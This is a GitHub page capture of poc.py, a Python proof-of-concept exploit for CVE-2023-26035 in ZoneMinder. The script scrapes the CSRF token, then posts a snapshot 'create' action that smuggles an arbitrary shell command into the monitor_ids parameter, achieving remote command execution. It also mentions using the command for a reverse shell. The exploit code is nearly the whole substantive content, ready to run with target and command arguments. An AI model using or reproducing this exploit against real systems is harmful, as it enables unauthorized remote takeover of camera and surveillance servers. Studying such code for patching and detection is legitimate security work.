{"payload":{"allShortcutsEnabled":true,"fileTree":{"":{"items":[{"name":"imgs","path":"imgs","contentType":"directory"},{"name":"README.md","path":"README.md","contentType":"file"},{"name":"poc.py","path":"poc.py","contentType":"file"}],"totalCount":3}},"fileTreeProcessingTime":1.606935,"foldersToFetch":[],"repo":{"id":731218902,"defaultBranch":"main","name":"CVE-2023-26035","ownerLogin":"heapbytes","currentUserCanPush":false,"isFork":false,"isEmpty":false,"createdAt":"2023-12-13T15:40:24.000+00:00","ownerAvatar":"https://avatars.githubusercontent.com/u/56447720?v=4","public":true,"private":false,"isOrgOwned":false},"symbolsExpanded":true,"treeExpanded":true,"refInfo":{"name":"main","listCacheKey":"v0:1702482166.0","canEdit":true,"refType":"branch","currentOid":"d4e8ea3c551fc43aa8c1f804f5c89539f9b6f83f"},"path":"poc.py","currentUser":{"id":73044172,"login":"pyrexfm","userEmail":"francisco.vilarinho.pires@gmail.com"},"blob":{"rawLines":["import requests","import argparse","from lxml import html","","","class ZoneMinderExploit:","    def __init__(self, target_uri, cmd):","        self.target_uri = target_uri","        self.cmd = cmd","        self.csrf_magic = None","","    def print_csrf_magic(self):","        print(\"Fetching CSRF Token\")","        res = requests.get(self.target_uri + 'index.php')","","        if res.status_code == 200:","            self.csrf_magic = self.get_csrf_magic(res.text)","            if not self.csrf_magic or not self.csrf_magic.startswith('key:'):","                print(\"Unable to parse token.\")","                return","            print(f\"Got Token: {self.csrf_magic}\")","        else:","            print(\"Unable to fetch token.\")","","    def execute_command(self):","        self.print_csrf_magic()","","        print(\"[>] Sending payload..\")","        data = {","            'view': 'snapshot',","            'action': 'create',","            'monitor_ids[0][Id]': f';{self.cmd}',","            '__csrf_magic': self.csrf_magic","        }","","        try:","            response = requests.post(f\"{self.target_uri}/index.php\", data=data, timeout=5)","            if response.status_code == 200:","                print(\"[>] Command executed successfully!!\")","            else:","                print(\"[!] Failed to send payload\")","                print(f\"Error: {response.status_code}\")","                print(response.text)","","        except requests.Timeout:","            print(\"[!] Script executed by out of time limit (if u used revshell, this will exit the script)\")","","    def get_csrf_magic(self, html_content):","        tree = html.fromstring(html_content)","        csrf_magic = tree.xpath('//input[@name=\"__csrf_magic\"]/@value')","        return csrf_magic[0] if csrf_magic else None","","if __name__ == \"__main__\":","    parser = argparse.ArgumentParser(description='ZoneMinder Exploit')","    parser.add_argument('--target', required=True, help='Target URI (e.g., http://example.com/zm/)')","    parser.add_argument('--cmd', required=True, help='Command to execute on the target')","","    args = parser.parse_args()","    exploit = ZoneMinderExploit(args.target, args.cmd)","    exploit.execute_command()"],"stylingDirectives":[[{"start":0,"end":6,"cssClass":"pl-k"},{"start":7,"end":15,"cssClass":"pl-s1"}],[{"start":0,"end":6,"cssClass":"pl-k"},{"start":7,"end":15,"cssClass":"pl-s1"}],[{"start":0,"end":4,"cssClass":"pl-k"},{"start":5,"end":9,"cssClass":"pl-s1"},{"start":10,"end":16,"cssClass":"pl-k"},{"start":17,"end":21,"cssClass":"pl-s1"}],[],[],[{"start":0,"end":5,"cssClass":"pl-k"},{"start":6,"end":23,"cssClass":"pl-v"}],[{"start":4,"end":7,"cssClass":"pl-k"},{"start":8,"end":16,"cssClass":"pl-en"},{"start":17,"end":21,"cssClass":"pl-s1"},{"start":23,"end":33,"cssClass":"pl-s1"},{"start":35,"end":38,"cssClass":"pl-s1"}],[{"start":8,"end":12,"cssClass":"pl-s1"},{"start":13,"end":23,"cssClass":"pl-s1"},{"start":24,"end":25,"cssClass":"pl-c1"},{"start":26,"end":36,"cssClass":"pl-s1"}],[{"start":8,"end":12,"cssClass":"pl-s1"},{"start":13,"end":16,"cssClass":"pl-s1"},{"start":17,"end":18,"cssClass":"pl-c1"},{"start":19,"end":22,"cssClass":"pl-s1"}],[{"start":8,"end":12,"cssClass":"pl-s1"},{"start":13,"end":23,"cssClass":"pl-s1"},{"start":24,"end":25,"cssClass":"pl-c1"},{"start":26,"end":30,"cssClass":"pl-c1"}],[],[{"start":4,"end":7,"cssClass":"pl-k"},{"start":8,"end":24,"cssClass":"pl-en"},{"start":25,"end":29,"cssClass":"pl-s1"}],[{"start":8,"end":13,"cssClass":"pl-en"},{"start":14,"end":35,"cssClass":"pl-s"}],[{"start":8,"end":11,"cssClass":"pl-s1"},{"start":12,"end":13,"cssClass":"pl-c1"},{"start":14,"end":22,"cssClass":"pl-s1"},{"start":23,"end":26,"cssClass":"pl-en"},{"start":27,"end":31,"cssClass":"pl-s1"},{"start":32,"end":42,"cssClass":"pl-s1"},{"start":43,"end":44,"cssClass":"pl-c1"},{"start":45,"end":56,"cssClass":"pl-s"}],[],[{"start":8,"end":10,"cssClass":"pl-k"},{"start":11,"end":14,"cssClass":"pl-s1"},{"start":15,"end":26,"cssClass":"pl-s1"},{"start":27,"end":29,"cssClass":"pl-c1"},{"start":30,"end":33,"cssClass":"pl-c1"}],[{"start":12,"end":16,"cssClass":"pl-s1"},{"start":17,"end":27,"cssClass":"pl-s1"},{"start":28,"end":29,"cssClass":"pl-c1"},{"start":30,"end":34,"cssClass":"pl-s1"},{"start":35,"end":49,"cssClass":"pl-en"},{"start":50,"end":53,"cssClass":"pl-s1"},{"start":54,"end":58,"cssClass":"pl-s1"}],[{"start":12,"end":14,"cssClass":"pl-k"},{"start":15,"end":18,"cssClass":"pl-c1"},{"start":19,"end":23,"cssClass":"pl-s1"},{"start":24,"end":34,"cssClass":"pl-s1"},{"start":35,"end":37,"cssClass":"pl-c1"},{"start":38,"end":41,"cssClass":"pl-c1"},{"start":42,"end":46,"cssClass":"pl-s1"},{"start":47,"end":57,"cssClass":"pl-s1"},{"start":58,"end":68,"cssClass":"pl-en"},{"start":69,"end":75,"cssClass":"pl-s"}],[{"start":16,"end":21,"cssClass":"pl-en"},{"start":22,"end":46,"cssClass":"pl-s"}],[{"start":16,"end":22,"cssClass":"pl-k"}],[{"start":12,"end":17,"cssClass":"pl-en"},{"start":18,"end":49,"cssClass":"pl-s"},{"start":31,"end":48,"cssClass":"pl-s1"},{"start":31,"end":32,"cssClass":"pl-kos"},{"start":32,"end":36,"cssClass":"pl-s1"},{"start":37,"end":47,"cssClass":"pl-s1"},{"start":47,"end":48,"cssClass":"pl-kos"}],[{"start":8,"end":12,"cssClass":"pl-k"}],[{"start":12,"end":17,"cssClass":"pl-en"},{"start":18,"end":42,"cssClass":"pl-s"}],[],[{"start":4,"end":7,"cssClass":"pl-k"},{"start":8,"end":23,"cssClass":"pl-en"},{"start":24,"end":28,"cssClass":"pl-s1"}],[{"start":8,"end":12,"cssClass":"pl-s1"},{"start":13,"end":29,"cssClass":"pl-en"}],[],[{"start":8,"end":13,"cssClass":"pl-en"},{"start":14,"end":37,"cssClass":"pl-s"}],[{"start":8,"end":12,"cssClass":"pl-s1"},{"start":13,"end":14,"cssClass":"pl-c1"}],[{"start":12,"end":18,"cssClass":"pl-s"},{"start":20,"end":30,"cssClass":"pl-s"}],[{"start":12,"end":20,"cssClass":"pl-s"},{"start":22,"end":30,"cssClass":"pl-s"}],[{"start":12,"end":32,"cssClass":"pl-s"},{"start":34,"end":48,"cssClass":"pl-s"},{"start":37,"end":47,"cssClass":"pl-s1"},{"start":37,"end":38,"cssClass":"pl-kos"},{"start":38,"end":42,"cssClass":"pl-s1"},{"start":43,"end":46,"cssClass":"pl-s1"},{"start":46,"end":47,"cssClass":"pl-kos"}],[{"start":12,"end":26,"cssClass":"pl-s"},{"start":28,"end":32,"cssClass":"pl-s1"},{"start":33,"end":43,"cssClass":"pl-s1"}],[],[],[{"start":8,"end":11,"cssClass":"pl-k"}],[{"start":12,"end":20,"cssClass":"pl-s1"},{"start":21,"end":22,"cssClass":"pl-c1"},{"start":23,"end":31,"cssClass":"pl-s1"},{"start":32,"end":36,"cssClass":"pl-en"},{"start":37,"end":67,"cssClass":"pl-s"},{"start":39,"end":56,"cssClass":"pl-s1"},{"start":39,"end":40,"cssClass":"pl-kos"},{"start":40,"end":44,"cssClass":"pl-s1"},{"start":45,"end":55,"cssClass":"pl-s1"},{"start":55,"end":56,"cssClass":"pl-kos"},{"start":69,"end":73,"cssClass":"pl-s1"},{"start":73,"end":74,"cssClass":"pl-c1"},{"start":74,"end":78,"cssClass":"pl-s1"},{"start":80,"end":87,"cssClass":"pl-s1"},{"start":87,"end":88,"cssClass":"pl-c1"},{"start":88,"end":89,"cssClass":"pl-c1"}],[{"start":12,"end":14,"cssClass":"pl-k"},{"start":15,"end":23,"cssClass":"pl-s1"},{"start":24,"end":35,"cssClass":"pl-s1"},{"start":36,"end":38,"cssClass":"pl-c1"},{"start":39,"end":42,"cssClass":"pl-c1"}],[{"start":16,"end":21,"cssClass":"pl-en"},{"start":22,"end":59,"cssClass":"pl-s"}],[{"start":12,"end":16,"cssClass":"pl-k"}],[{"start":16,"end":21,"cssClass":"pl-en"},{"start":22,"end":50,"cssClass":"pl-s"}],[{"start":16,"end":21,"cssClass":"pl-en"},{"start":22,"end":54,"cssClass":"pl-s"},{"start":31,"end":53,"cssClass":"pl-s1"},{"start":31,"end":32,"cssClass":"pl-kos"},{"start":32,"end":40,"cssClass":"pl-s1"},{"start":41,"end":52,"cssClass":"pl-s1"},{"start":52,"end":53,"cssClass":"pl-kos"}],[{"start":16,"end":21,"cssClass":"pl-en"},{"start":22,"end":30,"cssClass":"pl-s1"},{"start":31,"end":35,"cssClass":"pl-s1"}],[],[{"start":8,"end":14,"cssClass":"pl-k"},{"start":15,"end":23,"cssClass":"pl-s1"},{"start":24,"end":31,"cssClass":"pl-v"}],[{"start":12,"end":17,"cssClass":"pl-en"},{"start":18,"end":108,"cssClass":"pl-s"}],[],[{"start":4,"end":7,"cssClass":"pl-k"},{"start":8,"end":22,"cssClass":"pl-en"},{"start":23,"end":27,"cssClass":"pl-s1"},{"start":29,"end":41,"cssClass":"pl-s1"}],[{"start":8,"end":12,"cssClass":"pl-s1"},{"start":13,"end":14,"cssClass":"pl-c1"},{"start":15,"end":19,"cssClass":"pl-s1"},{"start":20,"end":30,"cssClass":"pl-en"},{"start":31,"end":43,"cssClass":"pl-s1"}],[{"start":8,"end":18,"cssClass":"pl-s1"},{"start":19,"end":20,"cssClass":"pl-c1"},{"start":21,"end":25,"cssClass":"pl-s1"},{"start":26,"end":31,"cssClass":"pl-en"},{"start":32,"end":70,"cssClass":"pl-s"}],[{"start":8,"end":14,"cssClass":"pl-k"},{"start":15,"end":25,"cssClass":"pl-s1"},{"start":26,"end":27,"cssClass":"pl-c1"},{"start":29,"end":31,"cssClass":"pl-k"},{"start":32,"end":42,"cssClass":"pl-s1"},{"start":43,"end":47,"cssClass":"pl-k"},{"start":48,"end":52,"cssClass":"pl-c1"}],[],[{"start":0,"end":2,"cssClass":"pl-k"},{"start":3,"end":11,"cssClass":"pl-s1"},{"start":12,"end":14,"cssClass":"pl-c1"},{"start":15,"end":25,"cssClass":"pl-s"}],[{"start":4,"end":10,"cssClass":"pl-s1"},{"start":11,"end":12,"cssClass":"pl-c1"},{"start":13,"end":21,"cssClass":"pl-s1"},{"start":22,"end":36,"cssClass":"pl-v"},{"start":37,"end":48,"cssClass":"pl-s1"},{"start":48,"end":49,"cssClass":"pl-c1"},{"start":49,"end":69,"cssClass":"pl-s"}],[{"start":4,"end":10,"cssClass":"pl-s1"},{"start":11,"end":23,"cssClass":"pl-en"},{"start":24,"end":34,"cssClass":"pl-s"},{"start":36,"end":44,"cssClass":"pl-s1"},{"start":44,"end":45,"cssClass":"pl-c1"},{"start":45,"end":49,"cssClass":"pl-c1"},{"start":51,"end":55,"cssClass":"pl-s1"},{"start":55,"end":56,"cssClass":"pl-c1"},{"start":56,"end":99,"cssClass":"pl-s"}],[{"start":4,"end":10,"cssClass":"pl-s1"},{"start":11,"end":23,"cssClass":"pl-en"},{"start":24,"end":31,"cssClass":"pl-s"},{"start":33,"end":41,"cssClass":"pl-s1"},{"start":41,"end":42,"cssClass":"pl-c1"},{"start":42,"end":46,"cssClass":"pl-c1"},{"start":48,"end":52,"cssClass":"pl-s1"},{"start":52,"end":53,"cssClass":"pl-c1"},{"start":53,"end":87,"cssClass":"pl-s"}],[],[{"start":4,"end":8,"cssClass":"pl-s1"},{"start":9,"end":10,"cssClass":"pl-c1"},{"start":11,"end":17,"cssClass":"pl-s1"},{"start":18,"end":28,"cssClass":"pl-en"}],[{"start":4,"end":11,"cssClass":"pl-s1"},{"start":12,"end":13,"cssClass":"pl-c1"},{"start":14,"end":31,"cssClass":"pl-v"},{"start":32,"end":36,"cssClass":"pl-s1"},{"start":37,"end":43,"cssClass":"pl-s1"},{"start":45,"end":49,"cssClass":"pl-s1"},{"start":50,"end":53,"cssClass":"pl-s1"}],[{"start":4,"end":11,"cssClass":"pl-s1"},{"start":12,"end":27,"cssClass":"pl-en"}],[]],"csv":null,"csvError":null,"dependabotInfo":{"showConfigurationBanner":false,"configFilePath":null,"networkDependabotPath":"/heapbytes/CVE-2023-26035/network/updates","dismissConfigurationNoticePath":"/settings/dismiss-notice/dependabot_configuration_notice","configurationNoticeDismissed":false,"repoAlertsPath":"/heapbytes/CVE-2023-26035/security/dependabot","repoSecurityAndAnalysisPath":"/heapbytes/CVE-2023-26035/settings/security_analysis","repoOwnerIsOrg":false,"currentUserCanAdminRepo":false},"displayName":"poc.py","displayUrl":"https://github.com/heapbytes/CVE-2023-26035/blob/main/poc.py?raw=true","headerInfo":{"blobSize":"2.07 KB","deleteInfo":{"deleteTooltip":"Fork this repository and delete the file"},"editInfo":{"editTooltip":"Fork this repository and edit the file"},"ghDesktopPath":"x-github-client://openRepo/https://github.com/heapbytes/CVE-2023-26035?branch=main&filepath=poc.py","gitLfsPath":null,"onBranch":true,"shortPath":"a7be1fb","siteNavLoginPath":"/login?return_to=https%3A%2F%2Fgithub.com%2Fheapbytes%2FCVE-2023-26035%2Fblob%2Fmain%2Fpoc.py","isCSV":false,"isRichtext":false,"toc":null,"lineInfo":{"truncatedLoc":"61","truncatedSloc":"49"},"mode":"file"},"image":false,"isCodeownersFile":null,"isPlain":false,"isValidLegacyIssueTemplate":false,"issueTemplateHelpUrl":"https://docs.github.com/articles/about-issue-and-pull-request-templates","issueTemplate":null,"discussionTemplate":null,"language":"Python","languageID":303,"large":false,"loggedIn":true,"newDiscussionPath":"/heapbytes/CVE-2023-26035/discussions/new","newIssuePath":"/heapbytes/CVE-2023-26035/issues/new","planSupportInfo":{"repoIsFork":null,"repoOwnedByCurrentUser":null,"requestFullPath":"/heapbytes/CVE-2023-26035/blob/main/poc.py","showFreeOrgGatedFeatureMessage":null,"showPlanSupportBanner":null,"upgradeDataAttributes":null,"upgradePath":null},"publishBannersInfo":{"dismissActionNoticePath":"/settings/dismiss-notice/publish_action_from_dockerfile","releasePath":"/heapbytes/CVE-2023-26035/releases/new?marketplace=true","showPublishActionBanner":false},"rawBlobUrl":"https://github.com/heapbytes/CVE-2023-26035/raw/main/poc.py","renderImageOrRaw":false,"richText":null,"renderedFileInfo":null,"shortPath":null,"symbolsEnabled":true,"tabSize":8,"topBannersInfo":{"overridingGlobalFundingFile":false,"globalPreferredFundingPath":null,"repoOwner":"heapbytes","repoName":"CVE-2023-26035","showInvalidCitationWarning":false,"citationHelpUrl":"https://docs.github.com/github/creating-cloning-and-archiving-repositories/creating-a-repository-on-github/about-citation-files","showDependabotConfigurationBanner":false,"actionsOnboardingTip":null},"truncated":false,"viewable":true,"workflowRedirectUrl":null,"symbols":{"timed_out":false,"not_analyzed":false,"symbols":[{"name":"ZoneMinderExploit","kind":"class","ident_start":62,"ident_end":79,"extent_start":56,"extent_end":1715,"fully_qualified_name":"ZoneMinderExploit","ident_utf16":{"start":{"line_number":5,"utf16_col":6},"end":{"line_number":5,"utf16_col":23}},"extent_utf16":{"start":{"line_number":5,"utf16_col":0},"end":{"line_number":50,"utf16_col":52}}},{"name":"__init__","kind":"function","ident_start":89,"ident_end":97,"extent_start":85,"extent_end":212,"fully_qualified_name":"ZoneMinderExploit.__init__","ident_utf16":{"start":{"line_number":6,"utf16_col":8},"end":{"line_number":6,"utf16_col":16}},"extent_utf16":{"start":{"line_number":6,"utf16_col":4},"end":{"line_number":9,"utf16_col":30}}},{"name":"print_csrf_magic","kind":"function","ident_start":222,"ident_end":238,"extent_start":218,"extent_end":694,"fully_qualified_name":"ZoneMinderExploit.print_csrf_magic","ident_utf16":{"start":{"line_number":11,"utf16_col":8},"end":{"line_number":11,"utf16_col":24}},"extent_utf16":{"start":{"line_number":11,"utf16_col":4},"end":{"line_number":22,"utf16_col":43}}},{"name":"execute_command","kind":"function","ident_start":704,"ident_end":719,"extent_start":700,"extent_end":1500,"fully_qualified_name":"ZoneMinderExploit.execute_command","ident_utf16":{"start":{"line_number":24,"utf16_col":8},"end":{"line_number":24,"utf16_col":23}},"extent_utf16":{"start":{"line_number":24,"utf16_col":4},"end":{"line_number":45,"utf16_col":109}}},{"name":"get_csrf_magic","kind":"function","ident_start":1510,"ident_end":1524,"extent_start":1506,"extent_end":1715,"fully_qualified_name":"ZoneMinderExploit.get_csrf_magic","ident_utf16":{"start":{"line_number":47,"utf16_col":8},"end":{"line_number":47,"utf16_col":22}},"extent_utf16":{"start":{"line_number":47,"utf16_col":4},"end":{"line_number":50,"utf16_col":52}}}]}},"copilotInfo":null,"copilotAccessAllowed":false,"csrf_tokens":{"/heapbytes/CVE-2023-26035/branches":{"post":"FYk2Vq-BYBxfrvh240SdyKN9ILwMHC-_oOZ9VAjjgSkm1rgDxhBkf8n4FL_t4gNfsr7ogya0sDQTqQPAH0wnJA"},"/repos/preferences":{"post":"SD26GCLQ_vtWziL7h9QP8rsvrWD0uf7Gj7th9SQtrCRiEIaEL2zwaQJWdvfrEd94kiV10ogDn5YE-I9KhNb5nw"}}},"title":"CVE-2023-26035/poc.py at main · heapbytes/CVE-2023-26035"}